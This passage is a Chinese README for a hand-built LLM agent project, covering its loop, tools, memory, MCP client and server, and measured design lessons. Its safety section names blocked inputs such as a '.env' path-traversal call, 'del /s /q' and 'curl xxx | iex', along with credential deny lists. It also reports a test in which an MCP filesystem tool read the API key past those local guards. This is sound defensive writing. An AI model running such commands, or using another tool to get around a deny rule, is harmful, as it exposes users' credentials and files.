# mini-agent

从零手写的 Agent 内核 —— 5 周学习项目的代码仓库。

没有 LangChain、没有框架封装：`messages` 列表、`while` 循环、工具协议、
MCP client / server、skill 全部手写。**每处设计决策都写了「为什么」和实测数字。**

| 周 | 主题 | 最重要的结论 |
|---|---|---|
| 1 | 让模型开口 | 模型的记忆**就是** `messages` 列表，没有别的 |
| 2 | 让模型动手 | 工具说明书是每轮固定开销；安全必须 fail-closed，不能靠模型自觉 |
| 3 | 记得住、活得下去 | 真值 vs 视图；session 是流水账，memory 是结论 |
| 4 | 从脚本变成项目 | 先装仪表盘再改系统；`async` 救不了同步函数 |
| 5 | MCP 与 skill | 协议适配在边缘；安全边界不够用时**新开窄路，不是放宽旧路** |

> 学习路线图不在本仓库内 —— 这里只放代码和结论。
> 想快速判断它有没有用，直接看下面「它现在能做什么」的三个实跑结果。

## 目录说明

```
mini-agent/
├── pyproject.toml      # 项目定义与依赖清单（uv 读它）
├── .python-version     # 锁定 Python 版本
├── uv.lock             # 依赖锁定，保证换机器环境一致
├── .gitignore          # 含 .env / .venv/ / data/ / MEMORY.md
├── .env.example        # 配置模板（进 Git）
├── .env                # 你的真实 Key（不进 Git，需自己从模板复制）
├── stage0_check.py     # 【阶段 0 交付物】调通一次模型接口
├── agent/
│   ├── __init__.py
│   ├── llm.py          # 模型调用封装 —— 唯一与厂商耦合的文件
│   ├── loop.py         # 核心循环 —— 记忆、工具轮次、技能注入都在这里
│   ├── session.py      # 【第 3 周】会话持久化（JSONL）
│   ├── context.py      # 【第 3 周】上下文裁剪（token 预算驱动）
│   ├── memory.py       # 【第 3 周】长期记忆（跨会话，防被裁剪）
│   ├── config.py       # 【第 3 周】配置化（把「凭据」与「配置」分开）
│   ├── metrics.py      # 【第 4 周】三段耗时 + token + 错误
│   ├── skills.py       # 【第 5 周】skill 两层渐进披露
│   ├── mcp/            # 【第 4 周扩展】手写的 MCP client
│   │   ├── protocol.py #   子进程 + 一行一条 JSON + 队列超时
│   │   ├── client.py   #   握手 / tools/list / tools/call
│   │   ├── tool.py     #   远端工具伪装成本地 Tool
│   │   └── host.py     #   进程级连接池 + 单 server 失败降级
│   └── tools/          # 【第 2 周】工具层
│       ├── __init__.py
│       ├── base.py       # 工具基类 + Schema 生成 + concurrency_safe
│       ├── registry.py   # 注册表 + 自动发现
│       ├── get_time.py   # 工具 1：读系统时间（无副作用）
│       ├── read_file.py  # 工具 2：读项目内文件（必须做路径校验）
│       ├── run_shell.py  # 工具 3：执行只读命令（必须做白名单）
│       ├── fetch_url.py  # 【第 5 周】只读 GET + SSRF 防护（替代 curl）
│       └── load_skill.py # 【第 5 周】按需读 skill 全文
├── skills/             # 【第 5 周】skill 说明书，一个目录一个技能
│   ├── aihot/
│   │   ├── SKILL.md
│   │   └── references/  #   第二层：细节留在 references，用到才读
│   └── news-summary/
│       └── SKILL.md
├── mcp_servers/        # 【第 5 周】自己写的 MCP server（独立进程）
│   ├── protocol.py     #   JSON-RPC over stdio
│   ├── docs_tools.py   #   4 个检索工具
│   ├── build_index.py  #   建 SQLite FTS5 索引
│   └── data/docs.db    #   索引产物（635 个小节）
├── server.py           # 【第 4 周】FastAPI 接口层
├── web/index.html      # 【第 4 周】原生 JS 聊天页（不引 Node 构建链）
├── cli.py              # 命令行入口
├── config.json         # 模型档案 + mcpServers（进 Git —— 它不是秘密）
├── tests/              # 83 条单测
├── docs/review-nanobot.md  # 【第 4 周】对照 nanobot 的复盘
├── data/sessions/      # 会话记录（JSONL，已在 .gitignore 中）
├── MEMORY.md           # 长期记忆（你自己也能编辑，已在 .gitignore 中）
└── .venv/              # 虚拟环境（uv 自动创建，不进 Git）
```

## 快速开始（换台机器照这个走）

```bash
# 1) 装 uv（仅新机器需要，已装可跳过）
powershell -ExecutionPolicy ByPass -c "irm https://astral.sh/uv/install.ps1 | iex"

# 2) 配 Key（仅第一次）
copy .env.example .env        # macOS / Linux 用 cp
# 编辑 .env，把模型接口地址、模型名、API Key 填上

# 3) 一条命令起 Web
uv run mini-agent-server
```

浏览器打开 http://127.0.0.1:8000 。

`uv run` 一件事全干了：读 `pyproject.toml` → 建 `.venv` → 按 `uv.lock` 装依赖 → 执行命令。
**不需要先 `pip install`，也不需要手动激活虚拟环境。**

> 命令是从 `[project.scripts]` 来的，等价于 `uv run python server.py`。
> 好处是换机器不用记「哪个文件是入口」。

**换机器会踩的两个坑（都在 `config.json` 里）：**

1. `base_url` 必须和你的 Key 是**同一家厂商**。不匹配会报 401「令牌已过期」——
   看着像 Key 过期，其实是拼错了厂商。详见下文「⚠️ 真实踩坑」。
2. `mcpServers.command` 写的是本机 **Windows 绝对路径**。macOS / Linux 上要改成
   `.venv/bin/python`，否则 MCP 连不上 —— 不会崩，只是少了那 4 个工具（单个 server 失败会降级）。

## 它现在能做什么（三个真实跑通的例子）

不是功能列表，是三次实际运行的结果。你 clone 下来应该能复现出同类的回答。

### 1. 查一份本机索引（hello-agents 教程，635 个小节）

```bash
uv run mini-agent --tools
> Hello-Agents 第九章 ContextBuilder 的 GSSC 流水线怎么实现的？
```

真实调用序列（7 次工具调用，10.8s）：

```
1. mcp_helloagents_search_docs({"query": "ContextBuilder"})
2. mcp_helloagents_search_docs({"query": "GSSC 流水线"})
3. mcp_helloagents_get_section({"section_id": 585})
4. mcp_helloagents_get_outline({"chapter": "9"})
5. mcp_helloagents_get_section({"section_id": 587})
6. mcp_helloagents_get_section({"section_id": 589})
7. mcp_helloagents_get_section({"section_id": 588})
```

注意它自己换了一次检索词再搜，然后取一小节试探，觉得不够才拉整章大纲、一次取三节。
**没人教它这个顺序** —— 工具描述里只写了「先 search 找候选，再用 get_section 取全文」。

> ⚠️ **一个反直觉的实测（2026-10-21）**：同一个问题**关掉工具**去问，模型把 GSSC 四个字母也答对了
> —— 这本书是公开的，早在训练数据里。
>
> 但**细节是编的**：它说 Select 阶段「按相关性、时效性、重要性筛选」，
> 而原文是按「相关性×权重 + 新近性×权重」打分、过滤掉 `min_relevance` 以下的项、再贪心填充到 token 预算。
>
> **所以判断「要不要接检索」的判据不是「数据是否私有」，而是「模型会不会编」。**
> 想干净地测「工具到底有没有用」，得用「今天发生了什么」这种**模型不可能见过**的问题（见下一个例子）。

### 2. 看今天的事（实时数据，模型不可能知道）

```bash
uv run mini-agent --tools
> 今天 AI 领域有什么值得关注的进展？要具体消息，带来源。
```

| | 关工具 | 开工具 |
|---|---|---|
| 回答 | 「我的知识截止于 2026 年 2 月，无法提供…」 | 8 条，带来源、分钟级时间戳、原文链接 |
| 耗时 | 3.5s | 15.5s |

模型会自己判断该读哪个技能：先 `load_skill("aihot")` 拿说明书，再 `fetch_url` 抓接口，
最后按说明书规定的格式出中文简报。**没有人告诉它这个顺序，是说明书写的。**

### 3. 本地三件小事

```bash
uv run mini-agent --tools
> 现在几点？把 pyproject.toml 读出来，告诉我项目叫什么。
```

它会连续调 `get_time` + `read_file`，两步完成。这两个工具都被安全边界约束着（见「四层安全边界」）。

## 常用命令

在本目录下执行（PyCharm 用 `Alt + F12` 打开内置 Terminal，它会自动停在本目录）：

```bash
uv add <包名>                    # 装依赖 —— .venv 在这一刻自动出现
uv add --dev <包名>              # 只装开发期用的（如 pytest），不进运行时依赖
uv sync                          # 按 uv.lock 把环境恢复成一致状态
uv run pytest                    # 跑全部单测（83 条）

uv run mini-agent-server         # 第 4 周：起 Web 界面（窗口要一直开着）
uv run mini-agent "你好"          # 单轮提问
uv run mini-agent                # 交互模式（多轮对话）
uv run mini-agent --stream       # 交互模式 + 流式输出
uv run mini-agent --tools        # 【第 2 周】交互模式 + 工具

uv run mini-agent --sessions                    # 【第 3 周】列出最近的会话
uv run mini-agent --resume 20261010-142117      # 恢复指定会话
uv run mini-agent --new-session                 # 强制开新会话
uv run mini-agent --no-compact                  # 【第 3 周】关掉上下文压缩
uv run mini-agent --no-memory                   # 【第 3 周】关掉长期记忆

uv run mini-agent --profiles                    # 【第 3 周】列出配置档案
uv run mini-agent --profile smart "你好"         # 【第 3 周】换一套配置跑

uv run python -m mcp_servers                    # 【第 5 周】起自己的 MCP server（调试用）
uv run python -m mcp_servers.build_index        # 【第 5 周】重建文档索引（数据变了才要跑）
```

> **`-m mcp_servers` 不需要你一直开着。** 它是给 Cursor / Claude Desktop 这类客户端用的工具库，
> 客户端会自己 spawn 一个。你手动跑的那个实例只用于调试，两者互不相干。
> 想看它能不能用，一条命令就够（不用写客户端）：
>
> ```bash
> echo '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}' | uv run python -m mcp_servers
> ```

> `uv run python cli.py ...` 和 `uv run mini-agent ...` 完全等价，前者也仍然可用。
> 打包之后推荐用后者 —— 它不依赖「你在哪个目录」。

交互模式内置命令：`/reset` 清空上下文，`/history` 查看消息列表，
`/tokens` 看裁剪是否生效，`/compact` 看压缩统计，
`/memory` 看长期记忆内容，`/remember <内容>` 写一条长期记忆，
`/config` 看当前生效的配置（不显示 Key），`/exit` 退出。

## 第 3 周：上下文裁剪 (context.py)

### 先算一笔账

每轮请求都要把**整个 messages** 重发。设每轮产生 100 token：

| 轮次 | 本轮发送 | 累计 |
|---|---|---|
| 第 1 轮 | 100 | 100 |
| 第 10 轮 | 1,000 | 5,500 |
| 第 50 轮 | 5,000 | **127,500** |

实际只说了 5,000 token 的话，却付了 127,500。**成本是平方级的。**

更要命的是模型有上下文窗口（如 128k）。撞上去不是「贵」，是**直接 HTTP 400，程序当场死**。

### 最关键的认知转变

| | 是什么 | 会被裁吗 |
|---|---|---|
| `self.messages` | **全量真相** —— 要落盘、`/history` 要看全 | **永不删减** |
| `self._view()` | **本次请求的视图**，每次临时算 | 会 |

前 3 周这两个一直是同一个东西，所以可以直接 `llm.chat(self.messages)`。现在必须分开。

**裁剪不是删数据，是「生成一个用于本次请求的视图」。**

### 三个设计决策

1. **双水位线** `KEEP_RECENT=8` / `COMPACT_AT=12`——留 4 条缓冲，避免
   「刚压完立刻又超 → 每轮都压」（每次压缩要花一次模型调用）。
   这两个数是可调参数：对话密度大就调低，需要长记忆就调高。
2. **摘要必须用 `role="system"`**——用 `assistant` 模型会以为这些话是**它自己说的**，
   可能把摘要当承诺去执行。`system` 才是「这是给你的背景资料」。
3. **依赖注入**——`context.py` **不 import llm**。摘要函数 `Summarizer` 由外部传入。
   因为 `llm.py` 是唯一与厂商耦合的文件（铁律）。
   **附带好处**：写单测时传个假函数就行，不用真调 API —— 这正是第 4 周要用的。

### 实测（真对话）

```
第 7 轮  [已压缩上下文] 14 条 → 10 条，约省 33 tokens
第 8 轮  [已压缩上下文] 16 条 → 10 条，约省 54 tokens
```

第 8 轮输入 token **175**（未压缩约 290）。压缩后仍能答对
「你叫旭，正在做狮山大学城改造设计项目」—— 摘要保住了关键信息。

摘要本身长这样（真实输出）：

```
以下是早先对话的摘要（更早的原始内容已省略）：
旭，建筑学大三学生，正在做狮山大学城改造项目设计（用AutoCAD），
同时学习Agent开发（已写到第3周）。讨厌吃香菜。
```

是人话，不是「取每句前 20 字」那种残句 —— 这就是必须用模型来摘要的原因。

## 第 3 周：为什么用 JSONL 而不是 JSON 数组

`data/sessions/20261010-142117.jsonl` 一行一个 JSON 对象：

```
{"type":"session","id":"...","created_at":"...","system":"你是简洁的中文助手..."}
{"type":"message","at":"...","message":{"role":"user","content":"我叫旭"}}
{"type":"message","at":"...","message":{"role":"assistant","content":"已记住，旭。"}}
```

| | JSON 数组 | JSONL（本项目选择） |
|---|---|---|
| 追加一条 | 读全文件 → 追加 → **整个写回** | `mode="a"` **只在末尾追加一行** |
| 中途崩了 | 整个历史一起坏 | 最多丢最后一行 |
| 坏了一行 | 整个文件读不出来 | 跳过那行，继续读 |
| 读的时候 | `json.load` 整个文件 | 逐行 `loads`，可以流式处理 |

**这是数据安全考虑，不是性能考虑。** 思路和 git 的 append-only 日志一样。

每行包一层 `{"type": ...}` 信封，是为了同一文件里以后能混进 `compact`（上下文压缩）、`meta` 之类的行，
读的时候 `if row["type"] == "message"` 就能筛出来 —— 加新类型不用改老文件格式。

### 一个容易想不通的点

文件第 1 行存了 system，磁盘上明明已经有了，为什么 `messages()` 读回时还要**再补一条** `{"role":"system"}`？

因为**模型只认你发给它的 `messages` 列表，它看不到磁盘上的任何文件。**
文件里的 system 是「存档」（给人看的），`self.messages[0]` 的 system 是「现场」（要发给模型的）。
少了这一步，模型仍然记得你说过的话（user/assistant 都在），但它的**身份和说话风格会突然变回默认值**。

## 第 3 周：长期记忆 (memory.py) —— session 记不住的地方

### 一个真实的现象

你 `/resume` 回某个会话，问「我叫什么」，它答不出来。查磁盘发现那次是**全新会话**，
压根没说过名字；而说过名字的是另一个会话。

**这不是 bug，是设计的必然后果。** 而且往深了想还有更麻烦的：

```
就算在同一个会话里 ——
  第 12 条触发压缩 →「我叫旭」这句从**视图**里被压掉
  数据没丢（还在磁盘），但模型看不到
  摘要写得粗糙 → 它就答「你没告诉过我名字」
```

而「用户叫旭」这种东西**永不变**，不该靠每次压缩去赌它有没有被保留。

### session vs memory

| | session（`session.py`） | memory（`memory.py`） |
|---|---|---|
| 是什么 | 原始流水账，每句都记 | 提炼后的结论，只记不变的 |
| 大小 | 大、精确、会长到几万 token | 小、抽象、几十行 |
| 生命周期 | 一次会话 | **跨所有会话**，永远活着 |
| 会被裁剪吗 | 会（`context.py` 压成摘要） | **不会，永远常驻** |
| 存哪 | `data/sessions/*.jsonl` | 项目根 `MEMORY.md` |
| 类比 | 聊天记录 | 给朋友画的「个人档案卡」 |

### 关键设计：注入位置必须在第 1 位

```python
# loop.py
def _inject_memory(self, view):
    return [view[0], self._memory_message, *view[1:]]
    #        ↑ 原始 system      ↑ 长期记忆      ↑ 其余对话
    #        第 0 位            第 1 位          第 2 位起
```

**为什么不能塞到最后？** 因为 `messages` 是**时间正序**的 —— 越靠后越「新」。

- 插在**第 1 位** → 模型理解为「开场时我就被告知的背景资料」✅
- 插在**最后** → 模型理解为「刚刚收到的一条新指令」❌，可能当成本轮任务去执行

长期记忆是**背景**，不是**事件**。另外注意 `*view[1:]` 是解包出的新列表，
`self.messages` 一个字节都没动 —— 和第 3 周学的「真值 vs 视图」是同一件事。

### 实测（3 个独立进程 / 独立会话）

| 场景 | 结果 |
|---|---|
| 会话 A 写入 `- 名字: 旭` → **全新会话 B** 问「我叫什么」 | ✅ 答出「你叫旭」 |
| 关掉 memory 再问同样的问题 | ❌ 答不出（证明起作用的是 memory） |
| 会话 A 说过、但**没写进** `MEMORY.md` 的「建筑学」 | ❌ 跨会话记不住（**边界，预期行为**） |
| 手工往 `MEMORY.md` 补 `- 专业: 建筑学大三` → 第 3 个会话 | ✅ 答出「建筑学专业，大三」 |

第 3 行是这一块最值得记住的事：**`memory.py` 不会自动判断什么值得记住。**
它只提供「读」和「写」两个动作。什么该进档案，目前由你（`/remember` 或手工编辑）决定 ——
nanobot 用 **Dream** 定时任务补上这一步（额外一次模型调用去复盘今天的对话）。

### 边界（避免过度期待）

- ✅ 手工写：你在 `MEMORY.md` 里写一行，下次对话它就知道了
- ✅ 程序追加：`/remember <内容>` 可以写进去
- ❌ 不会自动判断什么值得记住
- ❌ 不是「向量检索」——整份档案每轮都会被注入。所以**别往里塞 5000 字**，
  用 `/memory` 看一眼 `est_tokens` 心里有数

## 加一个新工具要做什么

**只做一件事：在 `agent/tools/` 下新建一个 .py 文件**，里面写 `Tool` 的子类，
填好 `name` / `description` / `parameters` 三个类属性，实现 `run()`。

注册表（`registry.py`）会自动扫描这个目录并收走它，**别处一行都不用改**。

### 到了第 5 周，扩展方式有三种，别选错

| 想做的事 | 用哪种 | 为什么 |
|---|---|---|
| 加一个能力（读文件、发请求、查数据库） | **本地工具** `agent/tools/*.py` | 进程内，零开销 |
| 加一套「怎么做这类活」的流程 | **skill** `skills/<名>/SKILL.md` | 纯文字，改完即生效，不用重启代码 |
| 想让**别的软件**也能用这个能力 | **MCP server** `mcp_servers/` | 独立进程，跨客户端 |

判断口诀：**能力用工具，经验用 skill，给别人用 MCP。**
最常犯的错是把「流程」写成工具 —— 那样模型每加一个流程你都要改一次代码。

## 第 2 周的代价：工具说明书是固定开销

`tools` 字段**每一轮请求都要重发一遍**。实测 1 个工具会让 `prompt_tokens` 从 17 涨到 276。

一次工具调用要发两次请求（先拿 `tool_calls`，回填结果后再拿答案），实测约 714 tokens ——
是普通一问一答的十倍。所以 `max_iterations` 不是可选项。

## 三条必须记住的规则

1. **Key 绝不进代码**：只放在 `.env` 里，`.env` 已在 `.gitignore` 中。
2. **不对公网暴露 Key**：不要把 `.env` 内容贴到任何聊天窗口或截图里。
3. **每次请求都要有上限**：`max_tokens` 管钱，`timeout` 管时间。

## 四层安全边界（第 2 周真正的内容）

工具 `parameters` 里的每个值都是**模型生成的字符串**，不是你敲的。所以工具层必须假设
「每个参数都可能有恶意」。

| 层 | 手段 | 挡住什么 |
|---|---|---|
| 1 | 路径限制在项目目录内（`is_relative_to`） | `read_file("../../.env")` 跑到项目外 |
| 2 | 敏感目标拒绝（`.env` / `.git/` / `.venv/` / `.key`） | `.env` **就在项目里**，第 1 层挡不住 |
| 3 | 命令白名单（不是黑名单） | `del /s /q`、`curl xxx \| iex` |
| 4 | 超时 + 固定工作目录 | 死循环命令、在 `C:\Windows` 里乱跑 |

第 2 层是验收时才补上的 —— 教训是：**第 1 层只回答「能不能出项目」，
不回答「项目里什么是敏感的」**。两个问题要分开想。

## 本项目最该记住的两条默认值原则

1. **fail-closed（默认拒绝）** —— 安全逻辑没写出来就一律拒绝。
   `read_file` 最初的版本是 fail-open 的：校验为空，代码直接落到
   `target = PROJECT_ROOT / path`，模型一句 `read_file("../.env")` 就能读出你的 Key。
2. **白名单优于黑名单** —— 「允许什么」永远列不全（`ALLOWED_COMMANDS` 6 个 vs 危险命令无穷），
   所以只列安全的；反过来关键凭据要有一份显式的 `DENIED_*` 清单。

**还有一条容易忘的**：安全不能依赖模型自觉。实测模型有时会主动拒绝危险请求，
但那只是它「觉得」不安全 —— 万一它觉得安全，工具层就必须自己拦住。

## 一个必须知道的坑：推理模型会「先思考再回答」

本项目用的模型带思考模式，会先产出一段 `reasoning_content`。**思考也算 token，也吃 `max_tokens`。**

症状：偶尔回复是空的。这时先看 `usage` 里的 `reasoning_tokens`，不要把锅甩给代码。

`agent/llm.py` 的 `chat()` 里已经加了针对这个的诊断报错。

## 第 3 周：配置化 (config.py) —— 把「凭据」和「配置」分开

### 做完之后是什么体验

```bash
uv run python cli.py --profiles          # 看有哪些配置档案
uv run python cli.py --profile smart "你好"      # 换一套配置跑，代码一行不改
```

`config.json` 里存着几套预设：

```json
{
  "default": "fast",
  "profiles": {
    "fast":  { "base_url": "...", "model": "deepseek-v4.1-flash", "max_tokens": 2048, "timeout": 60 },
    "smart": { "base_url": "...", "model": "deepseek-v4-pro",     "max_tokens": 8192, "timeout": 90 }
  }
}
```

### 唯一需要真正理解的事

**凭据（Credential）和配置（Config）不是一回事，应该分开放。**

| | 凭据 | 配置 |
|---|---|---|
| 是什么 | 证明「你是谁」 | 描述「怎么干活」 |
| 例子 | API Key | 模型名、超时、max_tokens |
| 属于 | **个人** | **项目** |
| 存哪 | `.env` | `config.json` |
| 进 Git 吗 | **绝不** | **应该进** |

**为什么这个区分重要？** 因为它们的**生命周期不一样**。你换台电脑，凭据要重新配；
但配置是跟着项目走的。混在一个文件里，就会出现两难：

- 把 `.env` 提交 → Key 泄露
- 不提交 → 别人 clone 下来完全不知道该怎么配模型

分开之后两个问题同时解决。这个原则不是我编的 —— 12-Factor App 的第 3 条**就是这一条**。

### 优先级链

```
--profile deepseek      ← 最高。本次启动说了算
LLM_PROFILE 环境变量     ← 次之。可以写进 shell 脚本 / CI
config.json 的 default   ← 兜底
内置常量 DEFAULT_PROFILE ← 最后兜底
```

### 两个细节值得一提

**1. 兜底不是到处都给。** `base_url` / `model` / `max_tokens` / `timeout` 都有兜底值 ——
因为它们错了顶多「效果不好」。但 **API Key 绝不给兜底** —— 它错了是「根本用不了」，
必须让程序在门口就报错。**兜底只该给「有合理默认值」的东西。**

**2. 打印配置时不显示 Key。** `Config.__repr__()` 和 `summary()` 都把 Key 掩码成
`abc123...wxyz`。因为**凭据泄露最常见的路径就是日志** —— 你 `print(config)` 调试一下，
Key 就出现在终端里，然后可能被粘进 issue、截图、聊天记录。

### ⚠️ 真实踩坑：地址、模型名、Key 必须是同一家

骨架交付后第一次跑，直接 401「令牌已过期或验证不正确」。**两个独立的问题**：

| # | 问题 | 现象 |
|---|---|---|
| 1 | `config.json` 的 `base_url` 写的是智谱官方，但 Key 是中转站的 | 401 |
| 2 | `deepseek-v4-flash` 已从中转站下线（改名 `deepseek-v4.1-flash`） | 404 `Model not exist` |

**教训一：三者必须配套。** 配置化把 `base_url` 从 `.env` 搬进 `config.json` 时，
如果用了一个「通用示例地址」，就会和用户实际的 Key 不匹配。
而报错信息是 401 —— **看起来像 Key 过期，实际是拼错了厂商**。误导性极强。

排查手法（值得记住）：用 raw HTTP 直接打一次，看**到底是 401 还是别的**：

```python
httpx.post(base + "/chat/completions",
           headers={"Authorization": "Bearer " + key},
           json={"model": model, "messages": [{"role": "user", "content": "hi"}]})
# 401 → 认证问题（Key / 地址不匹配）
# 404 model_not_found → 认证已过，是模型名不对
# 200 → 通了
```

**拿到 404 而不是 401 是个好消息** —— 说明认证已经通过，Key 是有效的，
只是模型名写错了。这一步能省掉「去后台翻 Key 是不是过期了」的半小时。

还可以先拉一次模型清单，看手上这个 Key 到底能调哪些：

```python
httpx.get(base + "/models", headers={"Authorization": "Bearer " + key}).json()["data"]
```

**教训二：模型名会下线。** `deepseek-v4-flash` 以前能用，现在没了。
所以「配置化」除了方便，还有个隐性价值：**换模型不用改代码，改一行 JSON 就行。**

### 一个「保持接口稳定」的实例

`llm.py` 里的 `load_config()` 被 `chat()` / `stream_chat()` / `make_summarizer()`
三处调用。这次改造它，我**没有改签名也没有改返回值的形状**，只把内部实现换成了
调用 `config.resolve()`。结果：**三个调用方一行都没动。**

这不是偷懒，是刻意的。接口是契约 —— 能不动就不动，改动成本会沿着调用链扩散。

## 第 4 周：接口层、指标、并发、测试

### 顺序上的一个教训：先装仪表盘，再改系统

原计划是「接口层 → 可观测性 → 并发 → 测试」。实际做到一半发现：**接口层做完，Web 端还是调不了工具。**

因为 `run()` / `stream()` 是一问一答，只有 `run_with_tools()` 才带工具循环。
文件名看着齐全，能力其实断链 —— **能力要按调用链逐个核对，不能按文件名想当然。**

而工具一旦接上 Web，立刻多出「一次请求内部调了几次模型、时间花在网络还是本地」这些问题。
答不出来就无法判断改动是好是坏。所以顺序改成：**先装仪表盘，再改系统。**

### 指标为什么必须分段

`agent/metrics.py` 记三段：`prepare` / `model` / `tool`。

本地工具是毫秒级，网络等待是秒级，**差三个数量级，混在一起平均等于没测**。

聚合时有两条纪律，都是踩出来的：

| 问题 | 做法 | 为什么 |
|---|---|---|
| 失败轮要不要计入平均耗时 | **一律排除** | 500 错误只要 0.3s，会把 60s 超时的真实情况掩盖掉 |
| 排除失败轮后分母怎么算 | **也只数成功轮** | 分子排除、分母不排除，平均值会凭空变小 |

另外：空列表返回 `{"turns": 0, "empty": true}`，不返回空 dict —— 让前端能区分「没数据」和「取不到」。

实测收益：慢请求跑了 17.3s 期间，另一个客户端请求 `/api/info` 只用了 **24.4ms**，说明线程池没被堵死。

### 并发：`async` 救不了同步函数

这是最容易想错的一点：

```
工具是同步阻塞函数（读文件、跑命令）
塞进 async def 里，没有 await 点 → 事件循环照样被卡住
→ 必须用线程池
```

实现就三行：

```python
jobs = [partial(self.tools.call, tc.name, tc.parsed_arguments()) for tc in tool_calls]
with ThreadPoolExecutor(max_workers=len(jobs)) as pool:
    return list(pool.map(lambda job: job(), jobs))
```

`pool.map` **保序** —— 这一点比快慢重要得多：

> **慢是可见的，顺序错是不可见的。**
> 结果顺序错了，模型会把 A 的结果当成 B 的，然后基于错误前提继续推理，答得很怪但不报错。

三条设计约束：

1. `Tool.concurrency_safe` 默认 **False**（fail-closed）。代价不对称：猜错「安全」→ 结果随机；猜错「不安全」→ 只是慢。
2. **整批要么全并行、要么全串行**，不挑安全的并行 —— 那会改变工具的意图顺序。
3. `max_workers` 直接用条数。比它小会排队，比它大是白占内存。

实测：两只真实读工具 0.70s → 0.50s（1.4×）。测试用两个各睡 0.4s 的假工具，阈值卡 0.7s。

### 连接池：948.7ms → 1.2ms

`httpx.Client()` 每次新建要 **948.7ms**（大头是 SSLContext 初始化），复用后一次请求 **1.2ms**。

所以 `llm.py` 改成进程级共享 + 懒加载。三个细节：

- `timeout` 仍然每次传（它跟请求走，不跟连接走）
- `keepalive_expiry` 属于 `httpx.Limits`，不属 `Timeout`
- 流式必须用 `client.stream()`；`client.post(stream=True)` 会把整个响应读完再返回

### 流式 + 工具：`tool_calls.arguments` 是碎片

即使开了 `stream=True`，参数也不是一次给全，而是按 `index` 分桶逐片下发：

```
帧1 index=0 id='call_x' name='get_time' args=''
帧2 index=0 id=None     name=None       args='{}'
帧3 index=1 id='call_y' name='read_file' args=''
帧4 index=1 id=None     name=None       args='{'
帧5 index=1 id=None     name=None       args='"path": "config.json"}'
```

三条只能照数据写、不能照直觉写的规则：

1. **`id` / `name` 只在首片出现** → 后续是 None，覆盖会把它们冲掉（`tool_call_id` 是回填对号的唯一凭据）
2. **`arguments` 逐片拼接** → 用 `=` 覆盖会只剩最后一片
3. **多个 index 交错下发** → 必须 dict 按 index 分桶，不能用 list 往后追加

还有一条反直觉的：**该轮 `content` 可能非空**（实测 11 个字符，模型先说「我来帮你查一下」再调工具）。
所以「content 为空」既不能当「要调工具」的判据，也不能当「失败」的判据 —— 唯一可靠判据是 `tool_calls` 本身。

## 第 5 周 · MCP client：内核不知道 MCP 存在

`agent/mcp/` 四个文件，`loop.py` 只多了一个 `mcp_servers` 参数。

```python
RemoteTool(远端工具)  →  伪装成本地 Tool  →  registry 里和 get_time 平级
```

**这是整个设计里最值得学的一点：协议适配发生在边缘，不在内核。** 内核只管「有哪些工具、叫什么、参数是什么」。

### 三个传输层的坑（都会表现成「莫名不动」）

| # | 坑 | 后果 | 解法 |
|---|---|---|---|
| 1 | `readline()` 没有超时 | server 卡住 → 整个 Agent 停住 | 读线程 + `queue.get(timeout)` |
| 2 | `stderr=PIPE` 没人读 | 缓冲区写满后**子进程在 write 上永久阻塞** | 单独起线程读干 stderr |
| 3 | Windows 的 `npx` 实为 `npx.CMD` | `Popen` 直接 spawn 失败 | `cmd /d /c` 包裹 |

第 2 条最阴：它不报错，只是进程不往下走了。

### 工具说明书的代价

| | prompt_tokens |
|---|---|
| 空对话 | 17 |
| 接入 filesystem server（8 个工具） | **1565** |

而且**每一轮都要重发**。所以 `config.json` 里的 `enabledTools` 白名单不是可选项 —— 接一个 29 工具的 server 会让每轮固定开销涨到几千 token。

### ⚠️ 安全实测：四层防线只约束「自己写的工具」

同一个 `mini-agent/.env`：

| 路径 | 结果 |
|---|---|
| 本地 `read_file(".env")` | **拒绝**（第二层拦截） |
| MCP filesystem server 的 `read_text_file` | **读到了 436 字符，含 `LLM_API_KEY`** |

原因是四层防线写在 `agent/tools/` 里，而 MCP 工具是**另一条路径**。

结论有三条：
1. **「能不能出项目」和「项目里什么敏感」是两个独立问题** —— 前者正确不蕴含后者。
2. **任何外部工具都是新增的绕过路径。** 接 MCP 等于扩大攻击面，不是「白得一堆能力」。
3. **范围就是权限。** filesystem server 的根目录绝不能给项目根 —— 那会连 `data/sessions`、`.env` 一起交出去。

## 第 5 周 · 自己的 MCP server：635 个小节的文档检索

`mcp_servers/` 是**独立进程**，不 import `agent/` 任何东西。这才叫作品 —— 任何支持 MCP 的客户端都能直接用。

### 为什么用 FTS5，不用向量库

文档检索第一反应是上 embedding。这里没上，原因是**启动成本**：

| | SQLite FTS5 | 向量库（Chroma / FAISS） |
|---|---|---|
| 冷启动 | 毫秒级 | 要加载 embedding 模型，十几秒到几分钟 |
| 依赖 | Python 自带 | 额外几百 MB |
| 中文检索 | `trigram` 分词可用 | 更强（语义近似） |

关键约束在 MCP 这一侧：**server 是 stdio 子进程，握手前必须就绪。**
实测连一个 `npx` 的 filesystem server，首次握手已经要 19.3s。再叠几分钟模型加载 → **必然握手超时。**

所以分工是：**低频、可接受慢启动的场景用向量检索；要被随时 spawn 的 MCP server 用 FTS5。**

### 4 个工具，两级检索

| 工具 | 用途 |
|---|---|
| `list_chapters` | 先看有哪 16 章，确定往哪找 |
| `search_docs` | **主入口**：按技术词检索小节，回编号 + 上下文 |
| `get_outline` | 拿到某一章的小节标题列表 |
| `get_section` | 按编号取一小节全文 |

**为什么要两级**（先 search 拿编号，再 get_section 取全文）：
一次把整章塞进上下文是几万 token，而且大部分用不上。
两级检索的代价是多一次工具调用，收益是上下文只装真正要看的那一小节。

工具描述里还写了「查询用具体技术词，不要用整句问句」——
这是在**教模型怎么用工具**，属于工具设计的一部分，不是废话。

### 给 Cursor / Claude Desktop 配（含一个「看起来像协议错、其实是启动错」的坑）

配置文件放 `<用户目录>/.cursor/mcp.json`（全局，对所有项目生效）：

```json
{
  "mcpServers": {
    "helloagents": {
      "command": "D:\\WorkBuddy\\nanobot\\mini-agent\\.venv\\Scripts\\python.exe",
      "args": ["D:\\WorkBuddy\\nanobot\\mini-agent\\mcp_servers\\launch.py"]
    }
  }
}
```

**就这两行，没有 `cwd`，没有 `env`。** 这是踩坑之后简化出来的。

#### 踩过的坑：`MCP error -32000: Connection closed`

第一次配的时候写的是 `args: ["-m", "mcp_servers"]` + `"cwd": "<项目目录>"`，
自己测全通，Cursor 里却是红点。查出来是这个原因：

| 启动方式（实测四组） | 结果 |
|---|---|
| cwd=项目 + 设 `PYTHONPATH` | ✅ |
